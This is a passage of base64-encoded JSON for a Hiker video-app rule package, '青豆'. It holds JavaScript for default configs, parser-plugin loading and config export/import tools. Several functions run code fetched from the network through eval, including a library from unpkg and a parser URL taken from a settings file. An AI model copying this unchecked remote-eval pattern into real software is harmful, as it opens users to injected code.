aWxzVmlldyh0eXBlLCBpZCk7XFxcIlxcclxcbiAgICAgICAgfVxcclxcbiAgICB9LFxcclxcbiAgICBob21lUGFnZUNvbmZpZ3M6e1xcclxcbiAgICAgICAgdXNlOiBcXFwi6buY6K6kXFxcIixcXHJcXG4gICAgICAgIFxcXCLpu5jorqRcXFwiOiB7XFxyXFxuICAgICAgICAgICAgY29uZmlnOiBgbGV0IGQgPSBbXTtcXHJcXG5kLnB1c2goe1xcclxcbiAgICB0aXRsZTogJycsXFxyXFxuICAgIGltZzogJ2h0dHBzOi8vZ2l0Y29kZS5uZXQvcXFfNDE4NDY3NTYvaGlrZXIvLS9yYXcvbWFzdGVyL2ltZy/osYbnk6MucG5nJyxcXHJcXG4gICAgZGVzYzogJzAnLFxcclxcbiAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzEnLFxcclxcbiAgICB1cmw6ICdoaWtlcjovL3BhZ2Uvc2V0dGluZ1BhZ2UnXFxyXFxufSlcXHJcXG5cXHJcXG5sZXQgcyA9IFtcXFwi5o6o6I2QXFxcIiwgXFxcIueDremXqFxcXCIsIFxcXCLliIbnsbtcXFwiLCBcXFwi54mH5Y2VXFxcIiwgXFxcIuamnOWNlVxcXCIsIFxcXCLlsIbkuIrmmKBcXFwiXTtcXHJcXG5sZXQgaW1nID0gXFxcImh0dHBzOi8vZ2l0Y29kZS5uZXQvcXFfNDE4NDY3NTYvaGlrZXIvLS9yYXcvbWFzdGVyL2ltZy9cXFwiO1xcclxcbmZvciAobGV0IGkgaW4gcykge1xcclxcbiAgICBkLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6IHNbaV0sXFxyXFxuICAgICAgICBpbWc6IGltZyArIHNbaV0gKyAnLmpwZycsXFxyXFxuICAgICAgICBjb2xfdHlwZTogJ2ljb25fMicsXFxyXFxuICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIiArICckcGFnZXtmeXBhZ2V9LyMvJyArIHNbaV0gKyBcXFwiI25vSGlzdG9yeSNcXFwiXFxyXFxuICAgIH0pXFxyXFxufVxcclxcbnJldHVybiBkO2BcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfSxcXHJcXG4gICAgYW5hbHlzaXNDb25maWdzOiB7XFxyXFxuICAgICAgICB1c2U6IFxcXCLkuI3op6PmnpBcXFwiLFxcclxcbiAgICAgICAgXFxcIuS4jeino+aekFxcXCI6IHtcXHJcXG4gICAgICAgICAgICBjb25maWc6ICQudG9TdHJpbmcoKCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gaW5wdXQ7XFxyXFxuICAgICAgICAgICAgfSksXFxyXFxuICAgICAgICAgICAgc2V0dGluZzogJC50b1N0cmluZygoKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/or6Xmj5Lku7bml6Dorr7nva7pobXpnaJcXFwiO1xcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9LFxcclxcbiAgICAgICAgXFxcIuaWreaPklxcXCI6IHtcXHJcXG4gICAgICAgICAgICBjb25maWc6ICQudG9TdHJpbmcoKCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL0R1YW5OaWFuL015UGFyc2UuanNvblxcXCI7XFxyXFxuICAgICAgICAgICAgICAgIGxldCBvbGRmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvY2FjaGUvTXlQYXJzZVNldC5qc29uXFxcIjtcXHJcXG4gICAgICAgICAgICAgICAgaWYgKGZpbGVFeGlzdChmaWxlKSkge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCgnanNvbj0nICsgZmV0Y2goZmlsZSkpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGpzVXJsID0ganNvbi5zZXR0aW5ncy5jajtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoZmV0Y2goanNVcmwpKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBheXRtUGFyc2UoaW5wdXQpO1xcclxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZpbGVFeGlzdChvbGRmaWxlKSkge1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGpzVXJsID0gSlNPTi5wYXJzZShmZXRjaChvbGRmaWxlKSkuY2o7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKGZldGNoKGpzVXJsKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gYXl0bVBhcnNlKGlucHV0KTtcXHJcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/msqHmib7liLDmlq3mj5LphY3nva7mlofku7YnO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfSksXFxyXFxuICAgICAgICAgICAgc2V0dGluZzogJC50b1N0cmluZygoKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCBmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvRHVhbk5pYW4vTXlQYXJzZS5qc29uXFxcIjtcXHJcXG4gICAgICAgICAgICAgICAgbGV0IG9sZGZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9NeVBhcnNlU2V0Lmpzb25cXFwiO1xcclxcbiAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KGZpbGUpKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKCdqc29uPScgKyBmZXRjaChmaWxlKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsZXQganNVcmwgPSBqc29uLnNldHRpbmdzLmNqO1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbChmZXRjaChqc1VybCkpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNldFVybDtcXHJcXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmIChmaWxlRXhpc3Qob2xkZmlsZSkpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxldCBqc1VybCA9IEpTT04ucGFyc2UoZmV0Y2gob2xkZmlsZSkpLmNqO1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbChmZXRjaChqc1VybCkpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNldFVybDtcXHJcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL1JvdXRlP3J1bGU9TXlGaWVsZOG0sOKBvyZ0eXBlPeiuvue9rlxcXCI7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfVxcclxcbiAgICB9XFxyXFxufVxcclxcbiQuZXhwb3J0cyA9IGRlZmF1bHRDb25maWdzO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5bel5YW36ZuGXCIsXCJwYXRoXCI6XCJ1dGlsc1wiLFwicnVsZVwiOlwianM6XFxyXFxuLy/liJ3lp4vljJbphY3nva4sbmFtZeS4uumFjee9rumhueWQjeensFxcclxcbmZ1bmN0aW9uIGluaXRDb25maWdzKG5hbWUsIGNvbmZpZykge1xcclxcbiAgICBpZiAoIWNvbmZpZykge1xcclxcbiAgICAgICAgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxyXFxuICAgIH1cXHJcXG4gICAgaWYgKGNvbmZpZ1tuYW1lXSA9PSBudWxsKSB7XFxyXFxuICAgICAgICBsZXQgZGVmYXVsdENvbmZpZ3MgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kZWZhdWx0Q29uZmlnc1xcXCIpO1xcclxcbiAgICAgICAgY29uZmlnW25hbWVdID0gZGVmYXVsdENvbmZpZ3NbbmFtZV0gPyBkZWZhdWx0Q29uZmlnc1tuYW1lXSA6IHt9O1xcclxcbiAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpO1xcclxcbiAgICB9XFxyXFxuICAgIHJldHVybiBjb25maWc7XFxyXFxufVxcclxcblxcclxcbi8v6I635Y+W6YWN572u6aG5XFxyXFxuZnVuY3Rpb24gZ2V0Q29uZmlnKG5hbWUsIHJvb3RDb25maWcpIHtcXHJcXG4gICAgbGV0IGNvbmZpZyA9IHJvb3RDb25maWcgPyByb290Q29uZmlnIDogSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxyXFxuICAgIGlmIChuYW1lKSB7XFxyXFxuICAgICAgICBpZiAoY29uZmlnW25hbWVdID09IG51bGwpIHtcXHJcXG4gICAgICAgICAgICBjb25maWcgPSBpbml0Q29uZmlncyhuYW1lLCBjb25maWcpO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmV0dXJuIGNvbmZpZ1tuYW1lXTtcXHJcXG4gICAgfSBlbHNlIHtcXHJcXG4gICAgICAgIHJldHVybiBjb25maWc7XFxyXFxuICAgIH1cXHJcXG59XFxyXFxuXFxyXFxuLy/nvJbnoIHlt6XlhbfnsbtcXHJcXG5sZXQgWmlwVG9vbCA9IHtcXHJcXG4gICAgZGVwZW5kZW5jZTogJ2h0dHBzOi8vdW5wa2cuY29tL2x6LXN0cmluZ0AxLjQuNC9saWJzL2x6LXN0cmluZy5taW4uanMnLFxcclxcbiAgICBjb21wcmVzczoge1xcclxcbiAgICAgICAgc2l6ZToge1xcclxcbiAgICAgICAgICAgIGtleTogXFxcInRleHQtY29tcHJlc3Mtc2l6ZVxcXCIsXFxyXFxuICAgICAgICAgICAgc2V0OiAobmV3VmFsdWUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIodGhpcy5rZXksIG5ld1ZhbHVlLnRvU3RyaW5nKCkpXFxyXFxuICAgICAgICAgICAgfSxcXHJcXG4gICAgICAgICAgICBnZXQ6ICgpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhcnNlSW50KGdldE15VmFyKHRoaXMua2V5LCBcXFwiMFxcXCIpKVxcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICBleGVjOiAoaW5wdXQpID0+IHtcXHJcXG4gICAgICAgICAgICBldmFsKHJlcXVlc3QoWmlwVG9vbC5kZXBlbmRlbmNlKSlcXHJcXG4gICAgICAgICAgICBsZXQgcmVzdWx0ID0gTFpTdHJpbmcuY29tcHJlc3NUb0VuY29kZWRVUklDb21wb25lbnQoaW5wdXQpXFxyXFxuICAgICAgICAgICAgICAgIC8vIFppcFRvb2wuY29tcHJlc3Muc2l6ZS5zZXQocmVzdWx0Lmxlbmd0aCAqIDIpXFxyXFxuICAgICAgICAgICAgcmV0dXJuIHJlc3VsdFxcclxcbiAgICAgICAgfVxcclxcbiAgICB9LFxcclxcbiAgICBkZWNvbXByZXNzOiB7XFxyXFxuICAgICAgICBzaXplOiB7XFxyXFxuICAgICAgICAgICAgZ2V0OiAoKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiBnZXRNeVZhcihcXFwidGV4dC1kZWNvbXByZXNzXFxcIiwgXFxcIjBcXFwiKVxcclxcbiAgICAgICAgICAgICAgICAgICAgLmxlbmd0aFxcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICBleGVjOiAoaW5wdXQpID0+IHtcXHJcXG4gICAgICAgICAgICBldmFsKHJlcXVlc3QoWmlwVG9vbC5kZXBlbmRlbmNlKSlcXHJcXG4gICAgICAgICAgICBsZXQgcmVzdWx0ID0gTFpTdHJpbmcuZGVjb21wcmVzc0Zyb21FbmNvZGVkVVJJQ29tcG9uZW50KGlucHV0KVxcclxcbiAgICAgICAgICAgIHJldHVybiByZXN1bHRcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfVxcclxcbn1cXHJcXG5cXHJcXG4vLyDphY3nva7pobnlt6XlhbfnsbtcXHJcXG5sZXQgQ29uZmlnVG9vbCA9IHtcXHJcXG4gICAgZW5jVHlwZUxpc3Q6IFsnQmFzZTY0JywgJ1ppcHBlciddLmNvbmNhdChnZXRQYXN0ZXMoKSksXFxyXFxuICAgIHRvQ2xpcGJvYXJkOiAoY29uZmlnQ29tbWFuZCwgbmFtZSkgPT4ge1xcclxcbiAgICAgICAgaWYgKGNvbmZpZ0NvbW1hbmQuc3RhcnRzV2l0aCgndG9hc3Q6Ly8nKSkgcmV0dXJuIGNvbmZpZ0NvbW1hbmRcXHJcXG4gICAgICAgIGlmICghbmFtZSkge1xcclxcbiAgICAgICAgICAgIGxldCBjb21tYW5kU3BsaXRzID0gY29uZmlnQ29tbWFuZC5zcGxpdChcXFwi77+lXFxcIilcXHJcXG4gICAgICAgICAgICBuYW1lID0gY29tbWFuZFNwbGl0c1syXVxcclxcbiAgICAgICAgICAgIG5hbWUgPSBuYW1lID8gKFxcXCLigJxcXFwiICsgbmFtZSArIFxcXCLigJ1cXFwiKSA6ICcnXFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxyXFxuICAgICAgICByZXR1cm4gXFxcImNvcHk6Ly9cXFwiICsgY29uZmlnQ29tbWFuZCArIFxcXCIuanM6J3RvYXN0Oi8v5a+85Ye6XFxcIiArIG5hbWUgKyBcXFwi5oiQ5Yqf77yBJ1xcXCI7XFxyXFxuICAgIH0sXFxyXFxuICAgIGV4cG9ydDogKG5hbWUsIGNvbmZpZywgcmVtYXJrLCBlbmNUeXBlKSA9PiB7XFxyXFxuICAgICAgICBsZXQgc3ltYm9sID0gXFxcIumdkuixhuWPo+S7pO+/pVxcXCIgKyByZW1hcmsgKyBcXFwi77+lXFxcIiArIG5hbWUgKyBcXFwi77+lXFxcIiArIGVuY1R5cGUgKyBcXFwi77+lXFxcIjtcXHJcXG4gICAgICAgIGxldCByZXN1bHQgPSBjb25maWdcXHJcXG4gICAgICAgIGlmICh0eXBlb2YgcmVzdWx0ID09PSBcXFwib2JqZWN0XFxcIikge1xcclxcbiAgICAgICAgICAgIHJlc3VsdCA9IEpTT04uc3RyaW5naWZ5KGNvbmZpZyk7XFxyXFxuICAgICAgICB9IGVsc2UgaWYgKHR5cGVvZiByZXN1bHQgPT09IFxcXCJzdHJpbmdcXFwiKSB7XFxyXFxuICAgICAgICAgICAgcmVzdWx0ID0gY29uZmlnO1xcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICB0aHJvdyBcXFwi5a+85Ye65pWw5o2u5LiN5ZCI5rOVXFxcIlxcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgc3dpdGNoIChlbmNUeXBlKSB7XFxyXFxuICAgICAgICAgICAgY2FzZSAnQmFzZTY0JzpcXHJcXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gYmFzZTY0RW5jb2RlKHJlc3VsdCk7XFxyXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICAgICAgICAgIGNhc2UgJ1ppcHBlcic6XFxyXFxuICAgICAgICAgICAgICAgIHJlc3VsdCA9IFppcFRvb2wuY29tcHJlc3MuZXhlYyhyZXN1bHQpXFxyXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICAgICAgICAgIGRlZmF1bHQgOlxcclxcbiAgICAgICAgICAgICAgICBpZiAoZ2V0QXBwVmVyc2lvbigpID4gMjA3MCkge1xcclxcbiAgICAgICAgICAgICAgICAgICAgc3ltYm9sID0gXFxcIumdkuixhuWPo+S7pO+/pVxcXCIgKyByZW1hcmsgKyBcXFwi77+lXFxcIiArIG5hbWVcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IHNoYXJlUGFzdGUoQ29uZmlnVG9vbC5leHBvcnQobmFtZSwgY29uZmlnLCByZW1hcmssICdaaXBwZXInKSxlbmNUeXBlKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQgKyAnXFxcXG5cXFxcbicgKyBzeW1ib2xcXHJcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmm7TmlrDop4bnlYzniYjmnKzoh7MgQzIwNzAg5Lul5LiKJ1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgcmVzdWx0ID0gc3ltYm9sICsgcmVzdWx0XFxyXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcclxcbiAgICB9LFxcclxcbiAgICBpbXBvcnQ6IChjb25maWdDb21tYW5kKSA9PiB7XFxyXFxuICAgICAgICBsZXQgcmVzdWx0ID0gJydcXHJcXG4gICAgICAgIGlmIChjb25maWdDb21tYW5kLnN0YXJ0c1dpdGgoJ+S6kScpKSB7XFxyXFxuICAgICAgICAgICAgaWYgKGdldEFwcFZlcnNpb24oKSA+IDIwNzApIHtcXHJcXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gY29uZmlnQ29tbWFuZC5zcGxpdCgn6Z2S6LGGJylbMF0ucmVwbGFjZSgvXFxcXFxcXFxuLywgJycpXFxyXFxuICAgICAgICAgICAgICAgIGNvbmZpZ0NvbW1hbmQgPSBwYXJzZVBhc3RlKHJlc3VsdClcXHJcXG4gICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v6K+35pu05paw6KeG55WM54mI5pys6IezIEMyMDcwIOS7peS4iidcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICB0cnkge1xcclxcbiAgICAgICAgICAgIGxldCByZXN1bHRTcGxpdHMgPSBjb25maWdDb21tYW5kLnNwbGl0KFxcXCLvv6VcXFwiKVxcclxcbiAgICAgICAgICAgIGxldCBlbmNUeXBlID0gcmVzdWx0U3BsaXRzWzNdXFxyXFxuICAgICAgICAgICAgcmVzdWx0ID0gcmVzdWx0U3BsaXRzWzRdXFxyXFxuICAgICAgICAgICAgc3dpdGNoIChlbmNUeXBlKSB7XFxyXFxuICAgICAgICAgICAgICAgIGNhc2UgJ0Jhc2U2NCc6XFxyXFxuICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBiYXNlNjREZWNvZGUocmVzdWx0KTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcclxcbiAgICAgICAgICAgICAgICBjYXNlICdaaXBwZXInOlxcclxcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gWmlwVG9vbC5kZWNvbXByZXNzLmV4ZWMocmVzdWx0KVxcclxcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgIHJlc3VsdCA9IEpTT04ucGFyc2UocmVzdWx0KTtcXHJcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXHJcXG4gICAgICAgICAgICBsb2coZS5tZXNzYWdlKVxcclxcbiAgICAgICAgICAgIHRocm93IFxcXCLlr7zlhaXmlbDmja7kuI3lkIjms5VcXFwiXFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcclxcbiAgICB9XFxyXFxufVwifV0sXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIumdkuixhlwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vZW1wdHkjaW1tZXJzaXZlVGhlbWUjP3R5cGU9bW92aWUmaWQ9MzYwODEwOTQ7Z2V0O1VURi04O3tVc2VyLUFnZW50QE1vemlsbGEvNS4wIChMaW51eO+8m++8myBBbmRyb2lkIDEx77yb77ybIE1pIDEwIFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzg4LjAuNDMyNC4xNTIgTW9iaWxlIFNhZmFyaS81MzcuMzZ9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfMV92ZXJ0aWNhbF9waWNcIixcImZpbmRfcnVsZVwiOlwianM6KFxcbih0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcbiAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdChcXFwiaGlrZXI6Ly9wYWdlL21haW5cXFwiKSkucnVsZSk7XFxuICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxuICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxuICAgIH1cXG59XFxuKShcXFwibW92aWVcXFwiLFxcXCIzNjA4MTA5NFxcXCIsXFxcIueDrei+o+a7mueDq1xcXCIsXFxcImV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtkZXRhaWxzVmlldyh0eXBlLCBpZCk7XFxcIilcIixcImdyb3VwXCI6XCLikaDmjqjojZBcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcImxldCBmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvam9rZXIvcWRiX2NvbmZpZy5qc1xcXCI7XFxubGV0IGJha2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9qb2tlci9xZGJfY29uZmlnLmpzLmJha1xcXCI7XFxudHJ5IHtcXG4gICAgbGV0IGRlZmF1bHRDb25maWdzID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGVmYXVsdENvbmZpZ3M/cnVsZT3pnZLosYZcXFwiKTtcXG4gICAgaWYgKCFmaWxlRXhpc3QoZmlsZSkpIHtcXG4gICAgICAgIHdyaXRlRmlsZShmaWxlLCBKU09OLnN0cmluZ2lmeShkZWZhdWx0Q29uZmlncykpO1xcbiAgICB9ZWxzZXtcXG4gICAgICAgIHRyeXtcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChmaWxlKSk7XFxuICAgICAgICAgICAgY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc1tcXFwi6buY6K6kXFxcIl0gPSBkZWZhdWx0Q29uZmlncy5kZXRhaWxzVmlld0NvbmZpZ3NbXFxcIum7mOiupFxcXCJdO1xcbiAgICAgICAgICAgIGNvbmZpZy5ob21lUGFnZUNvbmZpZ3NbXFxcIum7mOiupFxcXCJdID0gZGVmYXVsdENvbmZpZ3MuaG9tZVBhZ2VDb25maWdzW1xcXCLpu5jorqRcXFwiXTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoZmlsZSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSk7XFxuICAgICAgICB9Y2F0Y2goZSl7XFxuICAgICAgICAgICAgd3JpdGVGaWxlKGJha2ZpbGUsIGZldGNoKGZpbGUpKTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoZmlsZSwgSlNPTi5zdHJpbmdpZnkoZGVmYXVsdENvbmZpZ3MpKTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBwdXRNeVZhcihcXFwicWRiX2NvbmZpZ1xcXCIsIGZpbGUpO1xcbn0gY2F0Y2ggKGUpIHtcXG4gICAgbGV0IHBvcyA9IFxcXCLpooTlpITnkIZcXFwiO1xcbiAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdChcXFwiaGlrZXI6Ly9wYWdlL3VyZ2VuY3lNb2RlP3J1bGU96Z2S6LGGXFxcIikpLnJ1bGUpXFxufVwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLphY3nva7nvJbovpHnlYzpnaJcXFwiLFxcXCJwYXRoXFxcIjpcXFwic2V0dGluZy1lZGl0b3JcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4vKipcXFxcbiAqIOmAmui/h+S8oOWFpSBwYXJhbXMg5a+56LGh55Sf5oiQ57yW6L6R55WM6Z2iXFxcXG4gKiBAcGFyYW0gZCDop4bnlYwgc2V0UmVzdWx0IOeUqOeahOWIl+ihqFxcXFxuICogQHBhcmFtIGNvbmZpZ0tleSBjb25maWcg55qEIGtleSDlgLzvvIzmr5TlpoLmiJHopoHmi78gY29uZmlnLmRldGFpbHNWaWV3Q29uZmlnc++8jGNvbmZpZ0tleSDlsLHkvKAgXFxcXFxcXCJkZXRhaWxzVmlld0NvbmZpZ3NcXFxcXFxcIlxcXFxuICogQHBhcmFtIHBhcmFtcyDnvJbovpHnlYzpnaLnmoTphY3nva5cXFxcbiAqXFxcXG4gKiDjgJBwYXJhbXPlr7nosaHmlbDmja7npLrkvovjgJFcXFxcbiAqIHtcXFxcbiAgICAgICAga2V5OiBcXFxcXFxcImlucHV0X25hbWVcXFxcXFxcIixcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCLor7fovpPlhaXlkI3np7BcXFxcXFxcIixcXFxcbiAgICAgICAgdHlwZTogJ3RleHRhcmVhJyxcXFxcbiAgICAgICAgZGF0YToge1xcXFxuICAgICAgICAgICAgY29uZmlnOiB7XFxcXG4gICAgICAgICAgICAgICAga2V5OiBcXFxcXFxcImlucHV0X2NvZGVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpei+k+WFpemFjee9rlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHR5cGU6ICd0ZXh0YXJlYSdcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gKi9cXFxcbmZ1bmN0aW9uIG1vZGVFZGl0UGFnZShkLCBjb25maWdLZXksIHBhcmFtcykge1xcXFxuICAgIGFkZExpc3RlbmVyKCdvbkNsb3NlJywgJC50b1N0cmluZygocGFyYW1zKSA9PiB7XFxcXG4gICAgICAgIGNsZWFyTXlWYXIocGFyYW1zLmtleSlcXFxcbiAgICAgICAgbGV0IGRhdGFzID0gcGFyYW1zLmRhdGE7XFxcXG4gICAgICAgIGxldCBkYXRhS2V5cyA9IE9iamVjdC5rZXlzKGRhdGFzKTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBkYXRhS2V5cykge1xcXFxuICAgICAgICAgICAgbGV0IGRhdGFLZXkgPSBkYXRhS2V5c1tpXVxcXFxuICAgICAgICAgICAgY2xlYXJNeVZhcihkYXRhc1tkYXRhS2V5XS5rZXkpXFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCBwYXJhbXMpKVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuS/neWtmFxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBwYXJhbXMuZGVzYyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdpbnB1dCcsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihwYXJhbXMua2V5LCBcXFxcXFxcIlxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIHR5cGU6IHBhcmFtcy50eXBlID8gcGFyYW1zLnR5cGUgOiAnJyxcXFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiAncHV0TXlWYXIoXFxcXFxcXCInICsgcGFyYW1zLmtleSArICdcXFxcXFxcIiwgaW5wdXQpJ1xcXFxuICAgICAgICB9XFxcXG4gICAgfSlcXFxcbiAgICBsZXQgZGF0YXMgPSBwYXJhbXMuZGF0YTtcXFxcbiAgICBsZXQgZGF0YUtleXMgPSBPYmplY3Qua2V5cyhkYXRhcyk7XFxcXG4gICAgZm9yIChsZXQgZGF0YUtleSBvZiBkYXRhS2V5cykge1xcXFxuICAgICAgICBsZXQgZGF0YSA9IGRhdGFzW2RhdGFLZXldXFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLkv53lrZhcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGRlc2M6IGRhdGEuZGVzYyxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnaW5wdXQnLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoZGF0YS5rZXksIFxcXFxcXFwiXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgIHR5cGU6IGRhdGEudHlwZSA/IGRhdGEudHlwZSA6ICcnLFxcXFxuICAgICAgICAgICAgICAgIGhlaWdodDogNSxcXFxcbiAgICAgICAgICAgICAgICBoaWdobGlnaHQ6IHRydWUsXFxcXG4gICAgICAgICAgICAgICAgb25DaGFuZ2U6ICdwdXRNeVZhcihcXFxcXFxcIicgKyBkYXRhLmtleSArICdcXFxcXFxcIiwgaW5wdXQpJ1xcXFxuICAgICAgICAgICAgfVxcXFxuI